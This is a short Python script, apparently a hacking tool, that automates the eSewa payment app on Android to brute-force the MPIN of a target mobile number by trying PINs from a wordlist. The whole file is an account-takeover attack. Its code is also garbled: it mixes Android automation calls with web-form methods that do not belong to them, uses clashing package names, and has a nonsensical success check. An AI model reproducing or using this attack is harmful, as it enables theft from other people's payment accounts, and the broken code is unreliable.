import uiautomator2 as u2
# Connect to the device
d = u2.connect()

# Launch the app (e.g., eSewa)
d.app_start("com.f1soft.esewa")

# Wait for the app to load
d.wait_activity("com.f1soft.esewa.app.main.MainActivity", timeout=20)

#Perform Automated Actions
d(resourceID="com.f1soft.esewa:id/toolbar_login/register").click()

print('\n--v1.1.3------**[~~*Vcypherr*~~]/coded by:VICKY**------v1.1.3--\n')
file = open('mpins.txt', 'r')

MobileNumber = input('Enter Mobile Number: ').strip()
print("Target Mobile Number (+977):", MobileNumber)
print("\nTrying MPIN's from the list ...")

i = 0
while True:
    passw = file.readline().strip()
    i += 1
    if len(passw) < 4:
        continue
    print(str(i) + " : " + passw)
    try:
        response = d(resourceId="com.esewa.android:id/toolbar_login/register").click()
        if response.code == 200:
            d.select_form(nr=0)
            d.form['MobileNumber'] = MobileNumber
            d.form['MPIN'] = passw
            response = d.submit()
            response_data = response.read()
            if 'response_data' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
                print('Your MPIN is:', passw)
                break
    except Exception as e:
        print('Error:', e)